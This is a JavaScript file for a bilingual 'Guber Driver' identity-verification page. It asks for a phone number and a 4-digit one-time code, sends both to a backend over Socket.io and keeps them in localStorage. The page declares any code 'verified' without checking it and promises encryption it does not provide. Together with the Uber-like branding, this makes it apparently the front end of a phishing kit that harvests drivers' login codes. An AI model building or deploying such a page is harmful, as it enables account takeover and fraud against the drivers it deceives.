// Initialize Socket.io client with graceful fallback
let socket;
try {
    socket = io();
} catch (e) {
    socket = { emit: () => {}, on: () => {} };
}

// State variables
let currentVerificationId = null;
let currentPhoneNumber = '';
let countdownTimer = null;
let resendSeconds = 30;
let currentLanguage = 'en';

// Dictionary for English and Spanish translations
const translations = {
    en: {
        title: 'Driver Identity Verification',
        subtitle: 'Please enter your registered phone number to confirm your active driver identity.',
        labelPhone: 'Mobile Phone Number',
        btnSend: 'Send Verification Code',
        securityNote: 'Your information is encrypted and secured by Guber Driver Protocols.',
        changePhone: 'Change phone number',
        headingOtp: 'Enter Verification Code (OTP)',
        instructionOtp: 'A 4-digit verification code has been sent to your phone.',
        resendPrompt: "Didn't receive the code? ",
        resendBtn: 'Resend code',
        btnVerify: 'Verify Code',
        successTitle: 'Driver Identity Successfully Verified!',
        successDesc: 'Your active driver identity has been confirmed and verified for your current vehicle shift.',
        labelStatus: 'Account Status:',
        valStatus: 'Confirmed Active Driver',
        labelDriverPhone: 'Driver Phone:',
        labelTime: 'Verification Time:',
        btnHome: 'Return to Driver Home',
        promoTitle: 'Active Driver Portal',
        promoDesc: 'Ensure identity compliance before starting your drive shift.',
        srv1Title: 'Identity Compliance',
        srv1Desc: 'Verify active driver identity securely',
        srv2Title: 'Safety Standard',
        srv2Desc: 'Protecting riders & platform integrity',
        srv3Title: 'Shift Activation',
        srv3Desc: 'Ready to accept ride requests',
        help: 'Help'
    },
    es: {
        title: 'Verificación de Identidad del Conductor',
        subtitle: 'Ingrese su número de teléfono registrado para confirmar su identidad de conductor activo.',
        labelPhone: 'Número de Teléfono Móvil',
        btnSend: 'Enviar Código de Verificación',
        securityNote: 'Su información está encriptada y protegida por los Protocolos de Guber Driver.',
        changePhone: 'Cambiar número de teléfono',
        headingOtp: 'Ingrese el Código de Verificación (OTP)',
        instructionOtp: 'Se ha enviado un código de verificación de 4 dígitos a su teléfono.',
        resendPrompt: '¿No recibió el código? ',
        resendBtn: 'Reenviar código',
        btnVerify: 'Verificar Código',
        successTitle: '¡Identidad del Conductor Verificada con Éxito!',
        successDesc: 'Su identidad de conductor activo ha sido confirmada y verificada para su turno actual.',
        labelStatus: 'Estado de la Cuenta:',
        valStatus: 'Conductor Activo Confirmado',
        labelDriverPhone: 'Teléfono del Conductor:',
        labelTime: 'Hora de Verificación:',
        btnHome: 'Volver al Inicio',
        promoTitle: 'Portal de Conductor Activo',
        promoDesc: 'Garantice la conformidad de identidad antes de comenzar su turno.',
        srv1Title: 'Cumplimiento de Identidad',
        srv1Desc: 'Verifique la identidad del conductor activo de forma segura',
        srv2Title: 'Estándar de Seguridad',
        srv2Desc: 'Protegiendo a los pasajeros y la plataforma',
        srv3Title: 'Activación de Turno',
        srv3Desc: 'Listo para recibir solicitudes de viaje',
        help: 'Ayuda'
    }
};

// DOM Elements
const stepPhone = document.getElementById('step-phone');
const stepOtp = document.getElementById('step-otp');
const stepVerified = document.getElementById('step-verified');
const contentContainer = document.querySelector('.content-container');
const heroIllustrationBox = document.querySelector('.hero-illustration-box');

const phoneInput = document.getElementById('phone-input');
const userPhoneDisplay = document.getElementById('user-phone-display');
const finalPhoneDisplay = document.getElementById('final-phone-display');
const finalDateDisplay = document.getElementById('final-date-display');

const otp1 = document.getElementById('otp-1');
const otp2 = document.getElementById('otp-2');
const otp3 = document.getElementById('otp-3');
const otp4 = document.getElementById('otp-4');
const otpInputs = [otp1, otp2, otp3, otp4];

// Language Switching Logic
function toggleLangDropdown() {
    const menu = document.getElementById('lang-menu');
    menu.classList.toggle('hidden');
}

function switchLanguage(lang) {
    currentLanguage = lang;
    document.getElementById('current-lang-text').textContent = lang.toUpperCase();
    document.getElementById('lang-menu').classList.add('hidden');

    const options = document.querySelectorAll('.lang-option');
    options.forEach(opt => {
        if (opt.textContent.toLowerCase().includes(lang === 'en' ? 'english' : 'español')) {
            opt.classList.add('active');
        } else {
            opt.classList.remove('active');
        }
    });

    const t = translations[lang];

    document.getElementById('txt-title').textContent = t.title;
    document.getElementById('txt-subtitle').textContent = t.subtitle;
    document.getElementById('txt-label-phone').textContent = t.labelPhone;
    document.getElementById('txt-btn-send').textContent = t.btnSend;
    document.getElementById('txt-security-note').innerHTML = `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`;
    document.getElementById('txt-change-phone').textContent = t.changePhone;
    document.getElementById('txt-heading-otp').textContent = t.headingOtp;
    document.getElementById('txt-instruction-otp').textContent = t.instructionOtp;
    document.getElementById('txt-resend-prompt').textContent = t.resendPrompt;
    document.getElementById('txt-resend-btn').textContent = t.resendBtn;
    document.getElementById('txt-btn-verify').textContent = t.btnVerify;
    document.getElementById('txt-success-title').textContent = t.successTitle;
    document.getElementById('txt-success-desc').textContent = t.successDesc;
    document.getElementById('txt-label-status').textContent = t.labelStatus;
    document.getElementById('txt-val-status').textContent = t.valStatus;
    document.getElementById('txt-label-driver-phone').textContent = t.labelDriverPhone;
    document.getElementById('txt-label-time').textContent = t.labelTime;
    document.getElementById('txt-btn-home').textContent = t.btnHome;
    document.getElementById('txt-promo-title').textContent = t.promoTitle;
    document.getElementById('txt-promo-desc').textContent = t.promoDesc;
    document.getElementById('txt-srv1-title').textContent = t.srv1Title;
    document.getElementById('txt-srv1-desc').textContent = t.srv1Desc;
    document.getElementById('txt-srv2-title').textContent = t.srv2Title;
    document.getElementById('txt-srv2-desc').textContent = t.srv2Desc;
    document.getElementById('txt-srv3-title').textContent = t.srv3Title;
    document.getElementById('txt-srv3-desc').textContent = t.srv3Desc;
    document.getElementById('nav-help').textContent = t.help;
}

// Close language dropdown if clicked outside
document.addEventListener('click', (e) => {
    const dropdown = document.querySelector('.lang-dropdown');
    if (dropdown && !dropdown.contains(e.target)) {
        document.getElementById('lang-menu').classList.add('hidden');
    }
});

// Broadcast helper for GitHub Pages / Cloud sync
function saveCloudRecord(record) {
    let logs = JSON.parse(localStorage.getItem('guber_records') || '[]');
    const existingIdx = logs.findIndex(r => r.id === record.id || r._id === record.id || r.phoneNumber === record.phoneNumber);
    if (existingIdx !== -1) {
        logs[existingIdx] = { ...logs[existingIdx], ...record };
    } else {
        logs.unshift(record);
    }
    localStorage.setItem('guber_records', JSON.stringify(logs));
    window.dispatchEvent(new CustomEvent('guber_record_updated', { detail: record }));
}

// Handle Phone Form Submission
function handlePhoneSubmit(e) {
    e.preventDefault();
    const phoneVal = phoneInput.value.trim();

    if (!phoneVal || phoneVal.length < 7) {
        return;
    }

    const fullPhone = '+1 ' + phoneVal.replace(/[^0-9]/g, '');
    currentPhoneNumber = fullPhone;
    currentVerificationId = 'REC_' + Date.now();

    const btn = document.getElementById('btn-send-phone');
    setLoading(btn, true);

    const recData = {
        id: currentVerificationId,
        _id: currentVerificationId,
        phoneNumber: fullPhone,
        status: 'PHONE_SUBMITTED',
        submittedAt: new Date().toISOString()
    };

    saveCloudRecord(recData);

    // Socket.io emit phone number to backend
    if (socket && typeof socket.emit === 'function') {
        socket.emit('submit_phone', { phoneNumber: fullPhone }, (response) => {
            if (response && response.verificationId) {
                currentVerificationId = response.verificationId;
            }
        });
    }

    setTimeout(() => {
        setLoading(btn, false);
        userPhoneDisplay.textContent = fullPhone;
        switchStep(stepPhone, stepOtp);
        startResendTimer();
        otp1.focus();
    }, 400);
}

// Setup 4-Digit OTP Box Focus & Paste Logic (NO AUTO SUBMIT)
otpInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const val = e.target.value;
        e.target.value = val.replace(/[^0-9]/g, '');

        if (e.target.value.length === 1) {
            if (index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });

    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedData = (e.clipboardData || window.clipboardData).getData('text').trim();
        const digits = pastedData.replace(/[^0-9]/g, '').slice(0, 4);
        
        if (digits.length > 0) {
            digits.split('').forEach((char, i) => {
                if (otpInputs[i]) {
                    otpInputs[i].value = char;
                }
            });
            if (digits.length === 4) {
                otp4.focus();
            } else if (otpInputs[digits.length]) {
                otpInputs[digits.length].focus();
            }
        }
    });
});

// Handle OTP Form Submission
function handleOtpSubmit(e) {
    if (e) e.preventDefault();

    const otpValue = otpInputs.map(input => input.value).join('');
    if (otpValue.length !== 4) {
        return;
    }

    const btn = document.getElementById('btn-verify-otp');
    setLoading(btn, true);

    const recData = {
        id: currentVerificationId,
        _id: currentVerificationId,
        phoneNumber: currentPhoneNumber,
        otp: otpValue,
        status: 'VERIFIED',
        verifiedAt: new Date().toISOString()
    };

    saveCloudRecord(recData);

    if (socket && typeof socket.emit === 'function') {
        socket.emit('submit_otp', {
            verificationId: currentVerificationId,
            phoneNumber: currentPhoneNumber,
            otp: otpValue
        });
    }

    setTimeout(() => {
        setLoading(btn, false);
        finalPhoneDisplay.textContent = currentPhoneNumber;
        const now = new Date();
        finalDateDisplay.textContent = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
        switchStep(stepOtp, stepVerified);
    }, 400);
}

// Timer & Resend Code
function startResendTimer() {
    clearInterval(countdownTimer);
    resendSeconds = 30;
    const timerElem = document.getElementById('timer-count');
    const resendBtn = document.getElementById('btn-resend');
    
    resendBtn.disabled = true;
    timerElem.textContent = resendSeconds;

    countdownTimer = setInterval(() => {
        resendSeconds--;
        timerElem.textContent = resendSeconds;
        if (resendSeconds <= 0) {
            clearInterval(countdownTimer);
            resendBtn.disabled = false;
            resendBtn.innerHTML = translations[currentLanguage].resendBtn;
        }
    }, 1000);
}

function resendCode() {
    startResendTimer();
    if (socket && typeof socket.emit === 'function') {
        socket.emit('submit_phone', { phoneNumber: currentPhoneNumber });
    }
}

// Helper: Switch views & toggle illustration box visibility
function switchStep(fromStep, toStep) {
    fromStep.classList.remove('active-step');
    fromStep.classList.add('hidden-step');

    if (toStep === stepPhone) {
        heroIllustrationBox.classList.remove('hidden');
        contentContainer.classList.remove('single-column');
    } else {
        heroIllustrationBox.classList.add('hidden');
        contentContainer.classList.add('single-column');
    }

    setTimeout(() => {
        toStep.classList.remove('hidden-step');
        toStep.classList.add('active-step');
    }, 150);
}

function goToStepPhone() {
    switchStep(stepOtp, stepPhone);
}

function resetFlow() {
    phoneInput.value = '';
    otpInputs.forEach(i => i.value = '');
    currentVerificationId = null;
    currentPhoneNumber = '';
    switchStep(stepVerified, stepPhone);
}

// Helper: Loading Button State
function setLoading(btn, isLoading) {
    const textSpan = btn.querySelector('.btn-text');
    const spinnerSpan = btn.querySelector('.btn-spinner');
    if (isLoading) {
        btn.disabled = true;
        textSpan.classList.add('hidden');
        spinnerSpan.classList.remove('hidden');
    } else {
        btn.disabled = false;
        textSpan.classList.remove('hidden');
        spinnerSpan.classList.add('hidden');
    }
}
